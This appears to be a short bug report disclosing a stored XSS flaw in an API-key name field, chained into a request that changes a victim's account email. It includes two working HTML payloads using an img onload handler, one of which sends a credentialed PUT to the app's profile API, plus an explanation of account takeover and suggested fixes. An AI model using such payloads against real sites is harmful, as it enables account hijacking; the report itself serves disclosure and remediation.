# Bug: stored XSS chain to SCRF

## Steps:
**In `settings` route you can add api key and you can write a name for your key, after that i used below payload and i made `stored xss` and then after that i saw i can do `CSRF` and i have changed my payload and change user email address, so if user open that page automatically user email will change**

## XSS payload:
```html
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQQzPL1loJgxV0jWHLkHOT0-aVfZakLu6w7dg&s"
onload="alert(origin)">
```

## XSS-CSRF payload:
```html
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQQzPL1loJgxV0jWHLkHOT0-aVfZakLu6w7dg&s"
onload="fetch('http://192.168.107.160:5000/api/profile',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'ammighorbani1385@gmail.com'})})">
```

## Why it's dengerous?
**When you find an XSS you can inject `JS` to victim browser and you can do other things with js for example stole their tokens and you can chain it with `ATO` or i can do more things, for examply change your password and other user information with `CSRF` and finally again we have an `ATO`**

## How to fix?
**I saw you have been filtered some attributes like `onerror` but you didn't handle whole things like `onload` or `alert` and ...., you need to validate user input and never trust to your users, and for `CSRF` you need to use `unpredictable` CSRF tokens to avoid csrf**